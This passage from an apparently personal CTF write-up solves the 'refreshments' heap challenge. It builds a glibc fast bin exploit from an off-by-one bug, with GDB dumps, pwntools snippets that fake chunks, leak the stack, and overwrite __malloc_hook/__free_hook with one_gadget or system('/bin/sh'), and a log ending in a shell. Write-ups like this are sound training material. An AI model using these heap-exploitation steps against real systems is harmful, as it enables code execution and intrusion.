    0x708552d99b70 <main_arena+80>: 0x0000000000000000      0x0000563cc1b90180
    0x708552d99b80 <main_arena+96>: 0x0000563cc1b900c0      0x0000708552d99b78
    0x708552d99b90 <main_arena+112>:        0x0000708552d99b78      0x0000708552d99b88
    0x708552d99ba0 <main_arena+128>:        0x0000708552d99b88      0x0000708552d99b98
    0x708552d99bb0 <main_arena+144>:        0x0000708552d99b98      0x0000708552d99ba8
```

`

As can be seen, heap addresses start with `0x56`, but in Ubuntu 24.04, they may start with `0x60`, `0x61`…, which is useful for a Fast Bin attack in this situation. It would also be nice to have a `0x21`-sized chunk that is freed, so that we have a pointer sufficiently above the top chunk’s address. We can’t use `0x61`-sized Fast Bin pointers for this because `calloc` will erase the contents and the heap allocator will fail.

Assuming we get a `0x21`-sized Fast Bin chunk, we will need to use the address of `main_arena + 5` to serve as a chunk shape:

`

```
    gef> set *(unsigned long*)0x7f80e3599b28 = 0x000061aaaaaaaaaa
    gef> x/20gx &main_arena
    0x7f80e3599b20 <main_arena>:    0x0000000000000000      0x000061aaaaaaaaaa
    0x7f80e3599b30 <main_arena+16>: 0x0000000000000000      0x0000000000000000
    0x7f80e3599b40 <main_arena+32>: 0x0000000000000000      0x0000584c267620c0
    0x7f80e3599b50 <main_arena+48>: 0x0000000000000000      0x0000000000000000
    0x7f80e3599b60 <main_arena+64>: 0x0000000000000000      0x0000000000000000
    0x7f80e3599b70 <main_arena+80>: 0x0000000000000000      0x0000584c26762180
    0x7f80e3599b80 <main_arena+96>: 0x0000584c267620c0      0x00007f80e3599b78
    0x7f80e3599b90 <main_arena+112>:        0x00007f80e3599b78      0x00007f80e3599b88
    0x7f80e3599ba0 <main_arena+128>:        0x00007f80e3599b88      0x00007f80e3599b98
    0x7f80e3599bb0 <main_arena+144>:        0x00007f80e3599b98      0x00007f80e3599ba8
    gef> x/20gx 0x7f80e3599b20 + 5
    0x7f80e3599b25 <main_arena+5>:  0xaaaaaaaaaa000000      0x0000000000000061
    0x7f80e3599b35 <main_arena+21>: 0x0000000000000000      0x0000000000000000
    0x7f80e3599b45 <main_arena+37>: 0x4c267620c0000000      0x0000000000000058
    0x7f80e3599b55 <main_arena+53>: 0x0000000000000000      0x0000000000000000
    0x7f80e3599b65 <main_arena+69>: 0x0000000000000000      0x0000000000000000
    0x7f80e3599b75 <main_arena+85>: 0x4c26762180000000      0x4c267620c0000058
    0x7f80e3599b85 <main_arena+101>:        0x80e3599b78000058      0x80e3599b7800007f
    0x7f80e3599b95 <main_arena+117>:        0x80e3599b8800007f      0x80e3599b8800007f
    0x7f80e3599ba5 <main_arena+133>:        0x80e3599b9800007f      0x80e3599b9800007f
    0x7f80e3599bb5 <main_arena+149>:        0x80e3599ba800007f      0x80e3599ba800007f
```

`

The way to get a `0x21`-size chunk is quite easy with the off-by-one vulnerability, so here’s the implementation:

`

```
    edit(5, p64(glibc.sym.main_arena + 5))
    
    create()  # 6
    
    edit(0, b'\0' * 0x58 + b'\x21')
    edit(4, b'\0' * 0x18 + b'\x41')
    delete(4)
    
    create()  # 7
```

`

At this point, if the heap addresses start with a valid byte that serves for a `0x61`-sized chunk, we will get a chunk near the top chunk’s address:

`

```
    gef> stack
    ---------------------------------------------------------------- Stack top (lower address) ----------------------------------------------------------------
    0x7fff30318240|+0x0000|+000: 0x0800000000000001
    0x7fff30318248|+0x0008|+001: 0x0000000000000004
    0x7fff30318250|+0x0010|+002: 0x000060c22ab89010  ->  0x0000000000000000
    0x7fff30318258|+0x0018|+003: 0x0000000000000000
    0x7fff30318260|+0x0020|+004: 0x0000000000000000
    0x7fff30318268|+0x0028|+005: 0x000060c22ab89130  ->  0x0000000000000000
    0x7fff30318270|+0x0030|+006: 0x0000000000000000
    0x7fff30318278|+0x0038|+007: 0x000060c22ab890d0  ->  0x0000000000000000
    0x7fff30318280|+0x0040|+008: 0x000060c22ab890d0  ->  0x0000000000000000
    0x7fff30318288|+0x0048|+009: 0x00007f9b55b99b35 <main_arena+0x15>  ->  0x0000000000000000
    0x7fff30318290|+0x0050|+010: 0x0000000000000000
    0x7fff30318298|+0x0058|+011: 0x0000000000000000
    0x7fff303182a0|+0x0060|+012: 0x000060c1ead807e0 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
    0x7fff303182a8|+0x0068|+013: 0x0fe41e75f9635900  <-  canary
    0x7fff303182b0|+0x0070|+014: 0x00007fff303183a0  ->  0x0000000000000001  <-  $r13
    0x7fff303182b8|+0x0078|+015: 0x0000000000000000
    0x7fff303182c0|+0x0080|+016: 0x000060c1ead807e0 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
    0x7fff303182c8|+0x0088|+017: 0x00007f9b5582074a <__libc_start_main+0xea>  ->  0x48000153cfe8c789  <-  retaddr[3] ($savedip)
    -------------------------------------------------------------- Stack bottom (higher address) --------------------------------------------------------------
```

`

At this point, we can modify this top chunk’s address and set it above `__malloc_hook`, because there are useful values there:

`

```
    gef> x/gx &__malloc_hook
    0x7f9b55b99b10 <__malloc_hook>: 0x0000000000000000
    gef> x/70gx 0x7f9b55b99b10 - 0x200
    0x7f9b55b99910 <_IO_2_1_stdin_+48>:     0x00007f9b55b99963      0x00007f9b55b99963
    0x7f9b55b99920 <_IO_2_1_stdin_+64>:     0x00007f9b55b99964      0x0000000000000000
    0x7f9b55b99930 <_IO_2_1_stdin_+80>:     0x0000000000000000      0x0000000000000000
    0x7f9b55b99940 <_IO_2_1_stdin_+96>:     0x0000000000000000      0x0000000000000000
    0x7f9b55b99950 <_IO_2_1_stdin_+112>:    0x0000000000000000      0xffffffffffffffff
    0x7f9b55b99960 <_IO_2_1_stdin_+128>:    0x0000000000000000      0x00007f9b55b9b790
    0x7f9b55b99970 <_IO_2_1_stdin_+144>:    0xffffffffffffffff      0x0000000000000000
    0x7f9b55b99980 <_IO_2_1_stdin_+160>:    0x00007f9b55b999c0      0x0000000000000000
    0x7f9b55b99990 <_IO_2_1_stdin_+176>:    0x0000000000000000      0x0000000000000000
    0x7f9b55b999a0 <_IO_2_1_stdin_+192>:    0x0000000000000000      0x0000000000000000
    0x7f9b55b999b0 <_IO_2_1_stdin_+208>:    0x0000000000000000      0x00007f9b55b986e0
    0x7f9b55b999c0 <_IO_wide_data_0>:       0x0000000000000000      0x0000000000000000
    0x7f9b55b999d0 <_IO_wide_data_0+16>:    0x0000000000000000      0x0000000000000000
    0x7f9b55b999e0 <_IO_wide_data_0+32>:    0x0000000000000000      0x0000000000000000
    0x7f9b55b999f0 <_IO_wide_data_0+48>:    0x0000000000000000      0x0000000000000000
    0x7f9b55b99a00 <_IO_wide_data_0+64>:    0x0000000000000000      0x0000000000000000
    0x7f9b55b99a10 <_IO_wide_data_0+80>:    0x0000000000000000      0x0000000000000000
    0x7f9b55b99a20 <_IO_wide_data_0+96>:    0x0000000000000000      0x0000000000000000
    0x7f9b55b99a30 <_IO_wide_data_0+112>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99a40 <_IO_wide_data_0+128>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99a50 <_IO_wide_data_0+144>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99a60 <_IO_wide_data_0+160>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99a70 <_IO_wide_data_0+176>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99a80 <_IO_wide_data_0+192>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99a90 <_IO_wide_data_0+208>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99aa0 <_IO_wide_data_0+224>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99ab0 <_IO_wide_data_0+240>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99ac0 <_IO_wide_data_0+256>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99ad0 <_IO_wide_data_0+272>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99ae0 <_IO_wide_data_0+288>:   0x0000000000000000      0x0000000000000000
    0x7f9b55b99af0 <_IO_wide_data_0+304>:   0x00007f9b55b98260      0x0000000000000000
    0x7f9b55b99b00 <__memalign_hook>:       0x00007f9b55879e00      0x00007f9b55879da0
    0x7f9b55b99b10 <__malloc_hook>: 0x0000000000000000      0x0000000000000000
    0x7f9b55b99b20 <main_arena>:    0x0000000000000000      0x000060c22ab89060
    0x7f9b55b99b30 <main_arena+16>: 0x0000000000000000      0x0000000000000000
```

`

For instance, we can use `_IO_2_1_stdin_ + 112`, which holds `0xffffffffffffffff`. This is a valid top chunk value and is placed at an aligned address, so there won’t be problems. We need exactly 5 chunks to get a chunk over `__malloc_hook`:

`

```
    try:
        edit(7, b'\0' * 3 + p64(0) * 8 + p64(glibc.sym._IO_2_1_stdin_ + 112))
    
        for _ in range(5):
            create()
    except EOFError:
        io.failure('Failed')
        exit(1)
```

`

The `try`-`except` block is to catch Fast Bin attack failures.

At this point we can use the edit routine to add a [`one_gadget`](https://github.com/david942j/one_gadget) shell here, the third one works:

`

```
    one_gadget = glibc.address + (0x3f6be, 0x3f712, 0xd6701)[2]
    
    edit(12, p64(0) * 6 + p64(one_gadget))
    create()  # 13
    
    io.interactive()
```

`

After that, we simply call `calloc` and we will get a shell:

`

```
    $ while true; do python3 solve_works_local.py && break; echo; done
    [*] './refreshments'
        Arch:       amd64-64-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
        RUNPATH:    b'./glibc/'
        SHSTK:      Enabled
        IBT:        Enabled
        Stripped:   No
    [+] Starting local process './refreshments': pid 695181
    [+] Glibc base address: 0x7e0de3200000
    [-] Failed
    [*] Process './refreshments' stopped with exit code -11 (SIGSEGV) (pid 695181)
    
    [*] './refreshments'
        Arch:       amd64-64-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
        RUNPATH:    b'./glibc/'
        SHSTK:      Enabled
        IBT:        Enabled
        Stripped:   No
    [+] Starting local process './refreshments': pid 695186
    [+] Glibc base address: 0x7772b3800000
    [*] Switching to interactive mode
    $ whoami
    rocky
```

`

This exploit also work locally on the provided `Dockerfile`. However, it looks like Docker also takes modern address ranges, so this does not imply that the exploit works on the remote instance. Indeed, this exploit fails on remote.

### Remote exploit (Ubuntu 22.04)

To solve the challenge remotely, I switched to Ubuntu 22.04 and modify the exploit. With this setup, Glibc addresses and PIE/heap addresses range from `0x7e**********` to `0x7f**********` and from `0x55**********` to `0x56**********`, respectively. Hence, it will behave the same way as the remote instance.

Probably, there is another approach to tackle this challenge, but I was obsessed with Fast Bin attack, and that’s essentially what I did.

The main problem was finding some memory region that holds a byte that can serve to allocate a valid `0x61`-sized chunk. I scanned several times Glibc memory that was `rw-`, memory from the heap, even memory from the loader. I found nothing really useful. I even considered using the canary that is saved on the TLS, with som chance of it starting with `0x61` or similar, but that’s not useful because there is nothing there:

`

```
    gef> tls -n
    $tls = 0x7f0b3c0ad700
    ------------------------------------------------------------------------------------------------------ TLS-0x80 ------------------------------------------------------------------------------------------------------
          0x7f0b3c0ad680|+0x0000|+000: 0x0000000000000000
          0x7f0b3c0ad688|+0x0008|+001: 0x00007f0b3be89420 <_nl_global_locale>  ->  0x00007f0b3be849a0 <_nl_C_LC_CTYPE>  ->  0x00007f0b3bc5554e <_nl_C_name>  ->  ...
          0x7f0b3c0ad690|+0x0010|+002: 0x00007f0b3be8cae0 <_res@GLIBC_2.2.5>  ->  0x0000000000000000
          0x7f0b3c0ad698|+0x0018|+003: 0x0000000000000000
          0x7f0b3c0ad6a0|+0x0020|+004: 0x00007f0b3bc3d8a0 <_nl_C_LC_CTYPE_tolower+0x200>  ->  0x0000000100000000
          0x7f0b3c0ad6a8|+0x0028|+005: 0x00007f0b3bc3dea0 <_nl_C_LC_CTYPE_toupper+0x200>  ->  0x0000000100000000
          0x7f0b3c0ad6b0|+0x0030|+006: 0x00007f0b3bc3e7a0 <_nl_C_LC_CTYPE_class+0x100>  ->  0x0002000200020002
          0x7f0b3c0ad6b8|+0x0038|+007: 0x0000000000000000
          0x7f0b3c0ad6c0|+0x0040|+008: 0x0000000000000000
          0x7f0b3c0ad6c8|+0x0048|+009: 0x00007f0b3be88b20 <main_arena>  ->  0x0000000000000000
          0x7f0b3c0ad6d0|+0x0050|+010: 0x0000000000000000
          0x7f0b3c0ad6d8|+0x0058|+011: 0x0000000000000000
          0x7f0b3c0ad6e0|+0x0060|+012: 0x0000000000000000
          0x7f0b3c0ad6e8|+0x0068|+013: 0x0000000000000000
          0x7f0b3c0ad6f0|+0x0070|+014: 0x0000000000000000
          0x7f0b3c0ad6f8|+0x0078|+015: 0x0000000000000000
    -------------------------------------------------------------------------------------------------------- TLS --------------------------------------------------------------------------------------------------------
     $r8  0x7f0b3c0ad700|+0x0000|+000: 0x00007f0b3c0ad700  ->  [loop detected]
          0x7f0b3c0ad708|+0x0008|+001: 0x00007f0b3c0ac010  ->  0x0000000000000001
          0x7f0b3c0ad710|+0x0010|+002: 0x00007f0b3c0ad700  ->  [loop detected]  <-  $r8
          0x7f0b3c0ad718|+0x0018|+003: 0x0000000000000000
          0x7f0b3c0ad720|+0x0020|+004: 0x0000000000000000
          0x7f0b3c0ad728|+0x0028|+005: 0x06be0c507e9b0900  <-  canary
          0x7f0b3c0ad730|+0x0030|+006: 0xab804d94cee9ebbc  <-  PTR_MANGLE cookie
          0x7f0b3c0ad738|+0x0038|+007: 0x0000000000000000
          0x7f0b3c0ad740|+0x0040|+008: 0x0000000000000000
          0x7f0b3c0ad748|+0x0048|+009: 0x0000000000000000
          0x7f0b3c0ad750|+0x0050|+010: 0x0000000000000000
          0x7f0b3c0ad758|+0x0058|+011: 0x0000000000000000
          0x7f0b3c0ad760|+0x0060|+012: 0x0000000000000000
          0x7f0b3c0ad768|+0x0068|+013: 0x0000000000000000
          0x7f0b3c0ad770|+0x0070|+014: 0x0000000000000000
          0x7f0b3c0ad778|+0x0078|+015: 0x0000000000000000
```

`

However, I needed to double-check because I was not confident on finding another approach, some House of “Something” technique or whatever. In the end, I found this region within the loader (`ld-linux-x86-64.so.2`):

`

```
    gef> x/20gx $libc + 0x5c1c20 - 0x20
    0x7f0b3c0b0c00 <dyn_temp+32>:   0x0000000000000006      0x00007ffdd0db41c8
    0x7f0b3c0b0c10 <dyn_temp+48>:   0x000000006ffffff0      0x00007ffdd0db438c
    0x7f0b3c0b0c20 <dyn_temp+64>:   0x000000006ffffef5      0x00007ffdd0db4168
    0x7f0b3c0b0c30 <dyn_temp+80>:   0x0000000000000000      0x0000000000000000
    0x7f0b3c0b0c40 <dyn_temp+96>:   0x0000000000000000      0x0000000000000000
    0x7f0b3c0b0c50 <dyn_temp+112>:  0x0000000000000000      0x0000000000000000
    0x7f0b3c0b0c60 <start_time>:    0x0001128ede50b1bc      0x000000000002d30a
    0x7f0b3c0b0c70 <__pointer_chk_guard_local>:     0xab804d94cee9ebbc      0x0000000000000000
    0x7f0b3c0b0c80 <_dl_argv>:      0x00007ffdd0d866b8      0x0000000000000001
    0x7f0b3c0b0c90: 0x0000000000000000      0x0000000000000000
    gef> telescope 0x7f0b3c0b0c00 20 -n
          0x7f0b3c0b0c00|+0x0000|+000: 0x0000000000000006
          0x7f0b3c0b0c08|+0x0008|+001: 0x00007ffdd0db41c8  ->  0x0000000000000000
          0x7f0b3c0b0c10|+0x0010|+002: 0x000000006ffffff0
          0x7f0b3c0b0c18|+0x0018|+003: 0x00007ffdd0db438c  ->  0x0002000200020000
          0x7f0b3c0b0c20|+0x0020|+004: 0x000000006ffffef5
          0x7f0b3c0b0c28|+0x0028|+005: 0x00007ffdd0db4168  ->  0x0000000100000003
          0x7f0b3c0b0c30|+0x0030|+006: 0x0000000000000000
          0x7f0b3c0b0c38|+0x0038|+007: 0x0000000000000000
          0x7f0b3c0b0c40|+0x0040|+008: 0x0000000000000000
          0x7f0b3c0b0c48|+0x0048|+009: 0x0000000000000000
          0x7f0b3c0b0c50|+0x0050|+010: 0x0000000000000000
          0x7f0b3c0b0c58|+0x0058|+011: 0x0000000000000000
          0x7f0b3c0b0c60|+0x0060|+012: 0x0001128ede50b1bc
          0x7f0b3c0b0c68|+0x0068|+013: 0x000000000002d30a
          0x7f0b3c0b0c70|+0x0070|+014: 0xab804d94cee9ebbc  <-  PTR_MANGLE cookie
          0x7f0b3c0b0c78|+0x0078|+015: 0x0000000000000000
          0x7f0b3c0b0c80|+0x0080|+016: 0x00007ffdd0d866b8  ->  0x00007ffdd0d86b3d  ->  0x77702f746f6f722f './refreshments'
          0x7f0b3c0b0c88|+0x0088|+017: 0x0000000000000001
          0x7f0b3c0b0c90|+0x0090|+018: 0x0000000000000000
          0x7f0b3c0b0c98|+0x0098|+019: 0x0000000000000000
```

`

We have `0x6f`! And what’s more, we have pointers to vDSO (red color) and the stack (magenta color)! This will be the actual chunk:

`

```
    gef> x/12gx $libc + 0x5c1c20 - 5
    0x7f0b3c0b0c1b <dyn_temp+59>:   0xfffef500007ffdd0      0xdb4168000000006f
    0x7f0b3c0b0c2b <dyn_temp+75>:   0x00000000007ffdd0      0x0000000000000000
    0x7f0b3c0b0c3b <dyn_temp+91>:   0x0000000000000000      0x0000000000000000
    0x7f0b3c0b0c4b <dyn_temp+107>:  0x0000000000000000      0x0000000000000000
    0x7f0b3c0b0c5b <dyn_temp+123>:  0x50b1bc0000000000      0x02d30a0001128ede
    0x7f0b3c0b0c6b <load_time+3>:   0xe9ebbc0000000000      0x000000ab804d94ce
```

`

We won’t be able to take the full stack address with the show routine, but only the last 3 bytes. However, this is not a problem because the first 3 bytes coincide with vDSO addresses:

`

```
    gef> vmmap [
    [ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
    Start              End                Size               Offset             Perm Path
    0x0000564b965a0000 0x0000564b965c1000 0x0000000000021000 0x0000000000000000 rw- [heap]
    0x00007ffdd0d66000 0x00007ffdd0d87000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $rsp, $rbp, $rsi, $r13
    0x00007ffdd0db0000 0x00007ffdd0db4000 0x0000000000004000 0x0000000000000000 r-- [vvar]
    0x00007ffdd0db4000 0x00007ffdd0db6000 0x0000000000002000 0x0000000000000000 r-x [vdso]
    0xffffffffff600000 0xffffffffff601000 0x0000000000001000 0x0000000000000000 --x [vsyscall]
```

`

So, we can get a stack leak, and take an offset to the stack-frame we are interested in:

`

```
    gef> frame 2
    #2  0x0000564b8121d55e in main ()
    gef> stack
    ---------------------------------------- Stack top (lower address) ----------------------------------------
    0x7ffdd0d86550|+0x0000|+000: 0x0600000000000001
    0x7ffdd0d86558|+0x0008|+001: 0x0000000000000002
    0x7ffdd0d86560|+0x0010|+002: 0x0000564b965a0010  ->  0x0000000000000000
    0x7ffdd0d86568|+0x0018|+003: 0x0000000000000000
    0x7ffdd0d86570|+0x0020|+004: 0x0000000000000000
    0x7ffdd0d86578|+0x0028|+005: 0x0000564b965a0130  ->  0x0000000000000000
    0x7ffdd0d86580|+0x0030|+006: 0x0000564b965a0070  ->  0x0000000000000000
    0x7ffdd0d86588|+0x0038|+007: 0x0000564b965a00d0  ->  0x0000000000000000
    0x7ffdd0d86590|+0x0040|+008: 0x0000000000000000
    0x7ffdd0d86598|+0x0048|+009: 0x0000000000000000
    0x7ffdd0d865a0|+0x0050|+010: 0x0000000000000000
    0x7ffdd0d865a8|+0x0058|+011: 0x0000000000000000
    0x7ffdd0d865b0|+0x0060|+012: 0x0000564b8121d7e0 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
    0x7ffdd0d865b8|+0x0068|+013: 0x06be0c507e9b0900  <-  canary
    0x7ffdd0d865c0|+0x0070|+014: 0x00007ffdd0d866b0  ->  0x0000000000000001  <-  $r13
    0x7ffdd0d865c8|+0x0078|+015: 0x0000000000000000
    0x7ffdd0d865d0|+0x0080|+016: 0x0000564b8121d7e0 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
    0x7ffdd0d865d8|+0x0088|+017: 0x00007f0b3bb0f74a <__libc_start_main+0xea>  ->  0x48000153cfe8c789  <-  retaddr[3] ($savedip)
    -------------------------------------- Stack bottom (higher address) --------------------------------------
    gef> p/x 0x00007ffdd0d866b8 - 0x7ffdd0d86550
    $3 = 0x168
```

`

This is the implementation, using a Fast Bin attack on that weird address:

`

```
    edit(5, p64(glibc.address + 0x5c1c20 - 5))
    
    create()  # 6
    create()  # 7
    
    data = show(7)
    stack_addr = u64(data[-3:] + data[:5]) - 0x168
    io.success(f'Stack address: {hex(stack_addr)}')
```

`

At this point, the rest of the exploit seemed to be a piece of cake, because we only need to allocate on the stack and modify the pointers of `ptr` to get an arbitrary read and write primitive that leads easily to arbitrary code execution. However, there was no byte that could serve as a valid size to allocate a `0x61`-size chunk with a Fast Bin attack.

So, if there is no such byte, is there a way to put it there? Actually yes! Let’s analyze the forgotten function `read_num`:

`

```
    unsigned __int64 read_num() {
      _QWORD buf[6]; // [rsp+0h] [rbp-30h] BYREF
    
      buf[5] = __readfsqword(0x28u);
      memset(buf, 0, 32);
      read(0, buf, 0x1Fu);
    
      return strtoul((const char*) buf, 0, 0);
    }
```

`

We have a buffer of 32 bytes to place whatever we want, so why don’t we input something like `"1\0...\x61"`? With this we ensure the function returns `1` as a number, and the rest of the buffer is stored on the stack, so we can use that `0x61` as a size for the Fast Bin attack.

The said buffer is allocated some bytes above the stack-frame of `main`:

`

```
    gef> stack
    --------------------------------------------------------------------------------------------- Stack top (lower address) ---------------------------------------------------------------------------------------------
    0x7fffffffe6e0|+0x0000|+000: 0x0000000000000001
    0x7fffffffe6e8|+0x0008|+001: 0x0000000000000000
    0x7fffffffe6f0|+0x0010|+002: 0x0000000000000000
    0x7fffffffe6f8|+0x0018|+003: 0x0000000000000000
    0x7fffffffe700|+0x0020|+004: 0x0000000000000000
    0x7fffffffe708|+0x0028|+005: 0x0000000000000000
    0x7fffffffe710|+0x0030|+006: 0x0000000000000000
    0x7fffffffe718|+0x0038|+007: 0x0000000000000000
    0x7fffffffe720|+0x0040|+008: 0x0000000000000000
    0x7fffffffe728|+0x0048|+009: 0x0000000000000000
    0x7fffffffe730|+0x0050|+010: 0x0000000000000000
    0x7fffffffe738|+0x0058|+011: 0x0000000000000000
    0x7fffffffe740|+0x0060|+012: 0x00005555555557e0 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
    0x7fffffffe748|+0x0068|+013: 0x689fe078442aac00  <-  canary
    0x7fffffffe750|+0x0070|+014: 0x00007fffffffe840  ->  0x0000000000000001  <-  $r13
    0x7fffffffe758|+0x0078|+015: 0x0000000000000000
    0x7fffffffe760|+0x0080|+016: 0x00005555555557e0 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
    0x7fffffffe768|+0x0088|+017: 0x00007ffff7a5b74a <__libc_start_main+0xea>  ->  0x48000153cfe8c789  <-  retaddr[1] ($savedip)
    ------------------------------------------------------------------------------------------- Stack bottom (higher address) -------------------------------------------------------------------------------------------
    gef> x/20gx 0x7fffffffe6e0 - 0x40
    0x7fffffffe6a0: 0x6161616161616161      0x6262626262626262
    0x7fffffffe6b0: 0x6363636363636363      0x000a646464646464
    0x7fffffffe6c0: 0x0000555555556030      0x689fe078442aac00
    0x7fffffffe6d0: 0x00007fffffffe760      0x000055555555555e
    0x7fffffffe6e0: 0x0000000000000001      0x0000000000000000
    0x7fffffffe6f0: 0x0000000000000000      0x0000000000000000
    0x7fffffffe700: 0x0000000000000000      0x0000000000000000
    0x7fffffffe710: 0x0000000000000000      0x0000000000000000
    0x7fffffffe720: 0x0000000000000000      0x0000000000000000
    0x7fffffffe730: 0x0000000000000000      0x0000000000000000
```

`

After some tests, we find that we can use the place of `0x6363636363636363` to put `0x61` like this:

`

```
    delete(0)
    delete(5)
    edit(6, p64(stack_addr - 0x38))
    
    create()  # 8
    create(option=b'1' + b'\0' * 15 + b'\x62')
```

`

However, we can’t use `0x61` because `calloc` erases the memory region, and it happens to remove the return address, so the program just crashes.

Here I was wondering whether it is possible to say `calloc` not to erase memory. And it is possible!, we only need to say it is an `mmap`-ed chunk (that is, the second bit of the flags). For instance, we can use `0x62`.

Actually, I used `0x6f` before for the Fast Bin attack, and I didn’t notice that the chunk was not erased. Now I know the reason. This is the relevant [source code](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3260).

Once we have a chunk on the stack, it is trivial to get code execution, because we have arbitrary read and write. We can modify a pointer on `ptr`, like `ptr[0]`, and set `__free_hook` to be `system`. Then, we can call `free` on a chunk that holds the string `"/bin/sh\0"`, so that it runs `system("/bin/sh")` instead and we get a shell:

`

```
    data = show(9)[:0x38]
    edit(9, data + p64(glibc.sym.__free_hook))
    edit(0, p64(glibc.sym.system))
    edit(8, b'/bin/sh\0')
```

---

*Truncated at 1200 lines. Full text: <https://7rocky.github.io/en/ctf/other/htb-stacksmash-ctf/refreshments/>*
